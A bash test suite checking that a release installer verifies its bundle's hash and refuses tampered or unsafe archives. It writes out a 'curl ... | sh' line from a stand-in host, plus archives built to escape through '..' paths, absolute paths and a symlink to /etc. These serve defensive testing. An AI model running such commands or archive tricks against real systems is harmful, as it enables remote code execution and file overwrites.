#!/usr/bin/env bash
# The release's installer assets, and install.sh run ALONE.
#
# A release attaches install.sh, install.sh.sha256 and nexa-deploy-<tag>.tar.gz,
# built by scripts/release-installer-assets.sh. The attached install.sh is the
# tagged one with its three release-stamp lines filled; downloaded by itself it
# fetches the bundle, checks it against the stamped sha256, and runs the
# bundle's installer. This drives all of it with a throwaway git repository and
# `file://` URLs (NEXA_INSTALL_BUNDLE_BASE_URL), so no network and no Docker.
#
# The inner action is `--help` or an unknown argument: both exit before the
# installer's preflight, so nothing here ever installs anything. `id` is faked
# to say root, because a CI runner is not, and the bootstrap refuses to
# download as anyone else.
#
# shellcheck shell=bash

set -uo pipefail

HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd -- "${HERE}/../.." && pwd)"
# shellcheck source=harness.sh
. "${HERE}/harness.sh"

ASSETS="${REPO}/scripts/release-installer-assets.sh"
TAG="v9.9.9"
GH_REPO="Example/nexa-bot"

printf 'standalone installer\n'

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

# --- A tagged commit to release from -------------------------------------------
#
# The working tree's deploy/ — the installer under test — committed into a
# repository of its own, so the build reads git objects exactly as it does in
# the release workflow.
SRC="${WORK}/src"
mkdir -p "$SRC"
cp -R "${REPO}/deploy" "${SRC}/deploy"
git_in() {
  GIT_AUTHOR_DATE='2026-01-01T00:00:00Z' GIT_COMMITTER_DATE='2026-01-01T00:00:00Z' \
    git -C "$SRC" -c user.name=test -c user.email=test@example.invalid -c commit.gpgsign=false "$@"
}
git_in init -q
git_in add deploy
git_in commit -qm tagged
COMMIT="$(git -C "$SRC" rev-parse HEAD)"

build_assets() { (cd "$SRC" && bash "$ASSETS" build "$@"); }

# A fake `id`: root unless FAKE_UID says otherwise. Everything else is the real
# tool's, so nothing but the uid is pretended.
FAKE_BIN="${WORK}/bin"
mkdir -p "$FAKE_BIN"
cat >"${FAKE_BIN}/id" <<'FAKE'
#!/usr/bin/env bash
if [ "${1:-}" = "-u" ]; then printf '%s\n' "${FAKE_UID:-0}"; exit 0; fi
exec /usr/bin/id "$@"
FAKE
chmod +x "${FAKE_BIN}/id"

# Runs a downloaded install.sh as the one-liner would, with stdin closed and a
# private TMPDIR so the test can see what is left behind. Sets OUT and STATUS.
run_alone() {
  local installer="$1" base="$2"
  shift 2
  rm -rf "${WORK}/tmp"
  mkdir -p "${WORK}/tmp"
  OUT="$(PATH="${FAKE_BIN}:${PATH}" TMPDIR="${WORK}/tmp" NEXA_INSTALL_BUNDLE_BASE_URL="$base" \
    bash "$installer" "$@" </dev/null 2>&1)"
  STATUS=$?
}
leftovers() { find "${WORK}/tmp" -mindepth 1 | head -5; }

# A stamped copy of the tagged installer for an arbitrary bundle — the shape the
# build produces, for archives the build would never make.
stamp_for() {
  local bundle="$1" dir="$2" hash
  hash="$(sha256sum "$bundle" | awk '{print $1}')"
  mkdir -p "$dir"
  sed -e "s|^NEXA_RELEASE_VERSION=\"\"$|NEXA_RELEASE_VERSION=\"${TAG}\"|" \
    -e "s|^NEXA_RELEASE_REPO=\"\"$|NEXA_RELEASE_REPO=\"${GH_REPO}\"|" \
    -e "s|^NEXA_RELEASE_BUNDLE_SHA256=\"\"$|NEXA_RELEASE_BUNDLE_SHA256=\"${hash}\"|" \
    "${SRC}/deploy/install.sh" >"${dir}/install.sh"
}

# --- Building the assets -------------------------------------------------------
test_case 'build writes install.sh, its .sha256 and the deploy bundle'
OUT_DIR="${WORK}/out"
if ! build_out="$(build_assets "$TAG" "$GH_REPO" "$COMMIT" "$OUT_DIR" 2>&1)"; then
  fail_test "the build failed: ${build_out}"
fi
for f in install.sh install.sh.sha256 "nexa-deploy-${TAG}.tar.gz"; do
  [ -f "${OUT_DIR}/${f}" ] || fail_test "no ${f}"
done
BUNDLE="${OUT_DIR}/nexa-deploy-${TAG}.tar.gz"
BUNDLE_SHA="$(sha256sum "$BUNDLE" | awk '{print $1}')"

test_case 'install.sh.sha256 is what `sha256sum -c` accepts in the download directory'
assert_equals 'sha256 line' "$(cd "$OUT_DIR" && sha256sum install.sh)" "$(cat "${OUT_DIR}/install.sh.sha256")"
assert_ok 'sha256sum -c' bash -c 'cd "$1" && sha256sum -c install.sh.sha256' _ "$OUT_DIR"

test_case 'the attached install.sh differs from the tagged one in its three stamp lines only'
changes="$(diff --unchanged-line-format='' --old-line-format='-%L' --new-line-format='+%L' \
  "${SRC}/deploy/install.sh" "${OUT_DIR}/install.sh")"
expected="$(printf '%s\n' '-NEXA_RELEASE_VERSION=""' '-NEXA_RELEASE_REPO=""' '-NEXA_RELEASE_BUNDLE_SHA256=""' \
  "+NEXA_RELEASE_VERSION=\"${TAG}\"" "+NEXA_RELEASE_REPO=\"${GH_REPO}\"" "+NEXA_RELEASE_BUNDLE_SHA256=\"${BUNDLE_SHA}\"")"
assert_equals 'diff against the tagged installer' "$expected" "$changes"

test_case 'the bundle is the tagged deploy/ tree, reproducibly'
listing="$(tar -tzf "$BUNDLE")"
assert_contains 'install.sh' "$listing" 'deploy/install.sh'
assert_contains 'nexa-lib.sh' "$listing" 'deploy/bin/nexa-lib.sh'
assert_contains 'botctl' "$listing" 'deploy/bin/botctl'
assert_contains 'compose.yml' "$listing" 'deploy/compose.yml'
assert_contains 'Caddyfile' "$listing" 'deploy/caddy/Caddyfile'
assert_not_contains 'nothing outside deploy/' "$(printf '%s\n' "$listing" | grep -v '^deploy/')" '/'
tar -xzOf "$BUNDLE" deploy/install.sh | cmp -s - "${SRC}/deploy/install.sh" ||
  fail_test 'the bundled install.sh is not the tagged one'
build_assets "$TAG" "$GH_REPO" "$COMMIT" "${WORK}/out-again" >/dev/null 2>&1 ||
  fail_test 'the second build failed'
cmp -s "$BUNDLE" "${WORK}/out-again/nexa-deploy-${TAG}.tar.gz" ||
  fail_test 'two builds of one commit produced different bundles'
cmp -s "${OUT_DIR}/install.sh" "${WORK}/out-again/install.sh" ||
  fail_test 'two builds of one commit produced different installers'

test_case 'the build reads the commit, never the working tree'
printf '\n# an uncommitted edit\n' >>"${SRC}/deploy/compose.yml"
build_assets "$TAG" "$GH_REPO" "$COMMIT" "${WORK}/out-dirty" >/dev/null 2>&1 ||
  fail_test 'the build failed with a dirty tree'
cmp -s "$BUNDLE" "${WORK}/out-dirty/nexa-deploy-${TAG}.tar.gz" ||
  fail_test 'an uncommitted edit reached the bundle'
git -C "$SRC" checkout -q -- deploy/compose.yml

test_case 'the build refuses a bad tag, repository, commit or an existing output directory'
assert_fails 'tag with ..' build_assets 'v1..2' "$GH_REPO" "$COMMIT" "${WORK}/o1"
assert_fails 'tag with a slash' build_assets 'v1/2' "$GH_REPO" "$COMMIT" "${WORK}/o2"
assert_fails 'repository with a quote' build_assets "$TAG" 'a/b"c' "$COMMIT" "${WORK}/o3"
assert_fails 'abbreviated commit' build_assets "$TAG" "$GH_REPO" "${COMMIT:0:12}" "${WORK}/o4"
assert_fails 'unknown commit' build_assets "$TAG" "$GH_REPO" "$(printf 'f%.0s' {1..40})" "${WORK}/o5"
assert_fails 'existing output directory' build_assets "$TAG" "$GH_REPO" "$COMMIT" "$OUT_DIR"

test_case 'the build refuses a tagged installer without exactly one of each stamp line'
sed -i '/^NEXA_RELEASE_REPO=""$/d' "${SRC}/deploy/install.sh"
git_in commit -qam 'no repo stamp'
assert_fails 'missing stamp line' build_assets "$TAG" "$GH_REPO" "$(git -C "$SRC" rev-parse HEAD)" "${WORK}/o6"
git -C "$SRC" show "${COMMIT}:deploy/install.sh" >"${SRC}/deploy/install.sh"
printf 'NEXA_RELEASE_VERSION=""\n' >>"${SRC}/deploy/install.sh"
git_in commit -qam 'two version stamps'
assert_fails 'duplicated stamp line' build_assets "$TAG" "$GH_REPO" "$(git -C "$SRC" rev-parse HEAD)" "${WORK}/o7"
git -C "$SRC" show "${COMMIT}:deploy/install.sh" >"${SRC}/deploy/install.sh"
git_in commit -qam 'back to the tagged installer'

test_case 'check-stamp refuses any change beyond the stamp'
TAGGED="${WORK}/tagged-install.sh"
git -C "$SRC" show "${COMMIT}:deploy/install.sh" >"$TAGGED"
assert_ok 'the built installer passes' \
  bash "$ASSETS" check-stamp "$TAGGED" "${OUT_DIR}/install.sh" "$TAG" "$GH_REPO" "$BUNDLE_SHA"
sed 's/^set -euo pipefail$/set -uo pipefail/' "${OUT_DIR}/install.sh" >"${WORK}/extra.sh"
assert_fails 'one more changed line' \
  bash "$ASSETS" check-stamp "$TAGGED" "${WORK}/extra.sh" "$TAG" "$GH_REPO" "$BUNDLE_SHA"
{
  cat "${OUT_DIR}/install.sh"
  printf 'curl https://example.invalid/x | sh\n'
} >"${WORK}/appended.sh"
assert_fails 'an appended line' \
  bash "$ASSETS" check-stamp "$TAGGED" "${WORK}/appended.sh" "$TAG" "$GH_REPO" "$BUNDLE_SHA"
assert_fails 'a stamp carrying another hash' \
  bash "$ASSETS" check-stamp "$TAGGED" "${OUT_DIR}/install.sh" "$TAG" "$GH_REPO" "$(printf '0%.0s' {1..64})"
assert_fails 'a stamp carrying another version' \
  bash "$ASSETS" check-stamp "$TAGGED" "${OUT_DIR}/install.sh" v9.9.8 "$GH_REPO" "$BUNDLE_SHA"
assert_fails 'an unstamped copy' \
  bash "$ASSETS" check-stamp "$TAGGED" "$TAGGED" "$TAG" "$GH_REPO" "$BUNDLE_SHA"
refusal="$(bash "$ASSETS" check-stamp "$TAGGED" "${WORK}/extra.sh" "$TAG" "$GH_REPO" "$BUNDLE_SHA" 2>&1)"
assert_contains 'says why' "$refusal" 'more than its release stamp'

# --- install.sh, alone ---------------------------------------------------------
DL="${WORK}/download"
mkdir -p "$DL"
cp "${OUT_DIR}/install.sh" "${DL}/install.sh"
SERVED="file://${OUT_DIR}"

test_case 'alone and stamped: downloads, verifies, and runs the bundle installer'
run_alone "${DL}/install.sh" "$SERVED" --help
assert_equals 'exit status' 0 "$STATUS"
assert_contains 'verified' "$OUT" "matches sha256 ${BUNDLE_SHA}"
assert_contains 'the inner installer ran' "$OUT" 'Install Nexa.'
assert_equals 'nothing left behind' '' "$(leftovers)"

test_case 'alone: the inner installer gets the arguments, and its exit status is returned'
run_alone "${DL}/install.sh" "$SERVED" --no-such-flag
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'the inner parser saw it' "$OUT" 'unknown argument "--no-such-flag"'
assert_equals 'nothing left behind' '' "$(leftovers)"

test_case 'alone: --version equal to the stamp is accepted'
run_alone "${DL}/install.sh" "$SERVED" --version "$TAG" --help
assert_equals 'exit status' 0 "$STATUS"
assert_contains 'the inner installer ran' "$OUT" 'Install Nexa.'

test_case 'alone: another --version is refused before anything is downloaded'
run_alone "${DL}/install.sh" "$SERVED" --version v9.9.8 --help
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'says which installer to get' "$OUT" "releases/download/v9.9.8/install.sh"
assert_not_contains 'no download' "$OUT" 'downloading'
assert_not_contains 'no inner run' "$OUT" 'Install Nexa.'

test_case 'alone: not root is refused before anything is downloaded'
FAKE_UID=1000 run_alone "${DL}/install.sh" "$SERVED" --help
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'says root' "$OUT" 'must run as root'
assert_not_contains 'no download' "$OUT" 'downloading'

test_case 'alone: plain http is not a protocol it will use, even when overridden'
run_alone "${DL}/install.sh" "http://127.0.0.1:9" --help
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'refused the download' "$OUT" 'could not download'
assert_contains 'curl refused the protocol itself' "$OUT" 'Protocol "http" not supported or disabled'

test_case 'alone: a tampered bundle is refused before it is unpacked or run'
# A WORKING archive whose installer leaves a mark: if the hash were not
# checked, it would unpack and run, and the mark would appear.
EVIL="${WORK}/evil"
MARK="${WORK}/tampered-bundle-ran"
mkdir -p "${EVIL}/tree"
cp -R "${SRC}/deploy" "${EVIL}/tree/deploy"
printf '#!/usr/bin/env bash\ntouch %q\n' "$MARK" >"${EVIL}/tree/deploy/install.sh"
tar -czf "${EVIL}/nexa-deploy-${TAG}.tar.gz" -C "${EVIL}/tree" deploy
run_alone "${DL}/install.sh" "file://${EVIL}" --help
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'says it does not match' "$OUT" 'does not match this installer'
assert_not_contains 'never verified' "$OUT" 'matches sha256'
[ ! -e "$MARK" ] || fail_test 'the tampered bundle was RUN'
assert_equals 'nothing left behind' '' "$(leftovers)"

test_case 'alone and unstamped: refused with what to do instead'
cp "$TAGGED" "${DL}/unstamped.sh"
run_alone "${DL}/unstamped.sh" "$SERVED" --help
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'says why' "$OUT" 'carries no release stamp'
assert_not_contains 'no download' "$OUT" 'downloading'

test_case 'alone with a damaged stamp: refused'
sed "s|^NEXA_RELEASE_BUNDLE_SHA256=\".*\"$|NEXA_RELEASE_BUNDLE_SHA256=\"abc\"|" \
  "${DL}/install.sh" >"${DL}/damaged.sh"
run_alone "${DL}/damaged.sh" "$SERVED" --help
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'says damaged' "$OUT" 'release stamp in this installer is damaged'

# Archives the build never makes, each correctly hashed, so only the listing
# check stands between them and the filesystem.
unsafe_archive() {
  local label="$1" dir="${WORK}/unsafe-$1"
  mkdir -p "$dir"
  shift
  "$@" "$dir" || fail_test "could not make the ${label} archive"
  stamp_for "${dir}/nexa-deploy-${TAG}.tar.gz" "${dir}/dl"
  run_alone "${dir}/dl/install.sh" "file://${dir}" --help
}

make_traversal() {
  mkdir -p "$1/t/deploy/bin" "$1/escape-target"
  cp -R "${SRC}/deploy/." "$1/t/deploy/"
  printf 'x\n' >"$1/t/escaped"
  # deploy/../escaped: inside the archive's own prefix, then out of it.
  tar -czPf "$1/nexa-deploy-${TAG}.tar.gz" -C "$1/t" deploy deploy/../escaped
}
make_absolute() {
  mkdir -p "$1/t"
  cp -R "${SRC}/deploy" "$1/t/deploy"
  printf 'x\n' >"$1/absolute-file"
  tar -czPf "$1/nexa-deploy-${TAG}.tar.gz" -C "$1/t" deploy "$1/absolute-file"
}
make_symlink() {
  mkdir -p "$1/t"
  cp -R "${SRC}/deploy" "$1/t/deploy"
  ln -s /etc "$1/t/deploy/link"
  tar -czf "$1/nexa-deploy-${TAG}.tar.gz" -C "$1/t" deploy
}
make_outside() {
  mkdir -p "$1/t"
  cp -R "${SRC}/deploy" "$1/t/deploy"
  printf 'x\n' >"$1/t/stray"
  tar -czf "$1/nexa-deploy-${TAG}.tar.gz" -C "$1/t" deploy stray
}

test_case 'alone: an archive with a .. path is refused'
unsafe_archive traversal make_traversal
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'says unsafe' "$OUT" 'unsafe path'
assert_not_contains 'no inner run' "$OUT" 'Install Nexa.'
assert_equals 'nothing unpacked or left behind' '' "$(leftovers)"

test_case 'alone: an archive with an absolute path is refused'
unsafe_archive absolute make_absolute
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'says unsafe' "$OUT" 'unsafe path'
assert_not_contains 'no inner run' "$OUT" 'Install Nexa.'

test_case 'alone: an archive holding a symlink is refused'
unsafe_archive symlink make_symlink
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'says not a file' "$OUT" 'not a file or a directory'
assert_not_contains 'no inner run' "$OUT" 'Install Nexa.'

test_case 'alone: an archive with entries outside deploy/ is refused'
unsafe_archive outside make_outside
assert_equals 'exit status' 1 "$STATUS"
assert_contains 'says outside' "$OUT" 'outside deploy/'

# --- The operator's answers ------------------------------------------------------
#
# `sudo bash install.sh` passes no --domain and no --acme-email. With a terminal
# the installer asks, validating the way the arguments are validated; without
# one it refuses as it always has. Driven with the installer SOURCED, as the
# botctl suite drives the owner inputs, so no root and no preflight.
operator_probe() {
  bash -c 'f="$1"; shift; . "$f"; preflight_operator_inputs; printf "DOMAIN=%s ACME=%s\n" "$DOMAIN" "$ACME_EMAIL"' \
    _ "${REPO}/deploy/install.sh" "$@" 2>&1
}

test_case 'no terminal: --domain and --acme-email are still required'
assert_contains 'domain' "$(operator_probe </dev/null)" '--domain is required.'
probe="$(bash -c 'f="$1"; shift; . "$f"; DOMAIN=admin.example.com; preflight_operator_inputs' _ "${REPO}/deploy/install.sh" </dev/null 2>&1)"
assert_contains 'acme e-mail' "$probe" '--acme-email is required'

test_case 'arguments are validated, never re-asked'
probe="$(bash -c 'f="$1"; shift; . "$f"; DOMAIN="https://x.example.com"; ACME_EMAIL=ops@example.com; preflight_operator_inputs' \
  _ "${REPO}/deploy/install.sh" </dev/null 2>&1)"
assert_contains 'bad domain' "$probe" 'is not a valid hostname'
probe="$(bash -c 'f="$1"; shift; . "$f"; DOMAIN=admin.example.com; ACME_EMAIL=nobody; preflight_operator_inputs' \
  _ "${REPO}/deploy/install.sh" </dev/null 2>&1)"
assert_contains 'bad e-mail' "$probe" 'does not look like an e-mail address'

test_case 'a terminal: both are asked for, until each is valid'
if command -v script >/dev/null 2>&1; then
  printf -v probe_cmd '%q -c %q _ %q' bash \
    'f="$1"; shift; . "$f"; preflight_operator_inputs; printf "DOMAIN=%s ACME=%s\n" "$DOMAIN" "$ACME_EMAIL"' \
    "${REPO}/deploy/install.sh"
  probe="$(printf '%s\n' 'https://admin.example.com' ' admin.example.com ' 'not-an-email' 'ops@example.com' |
    script -qec "$probe_cmd" /dev/null 2>&1 | tr -d '\r')"
  assert_contains 'asks for the domain' "$probe" 'Admin panel domain'
  assert_contains 're-asks a bad domain' "$probe" '"https://admin.example.com" is not a valid hostname'
  assert_contains 'asks for the e-mail' "$probe" "E-mail for Let's Encrypt"
  assert_contains 're-asks a bad e-mail' "$probe" '"not-an-email" does not look like an e-mail address'
  assert_contains 'keeps the trimmed answers' "$probe" 'DOMAIN=admin.example.com ACME=ops@example.com'
  probe="$(printf '%s\n' 'ops@example.com' | script -qec "$probe_cmd" /dev/null 2>&1 | tr -d '\r')"
  assert_contains 'ended input is a refusal' "$probe" 'input ended. Nothing was changed.'
elif [ "${CI:-}" = "true" ]; then
  fail_test 'script(1) is required in CI to drive the prompts through a terminal'
else
  printf '       (skipped: script(1) is not installed)\n'
fi

report
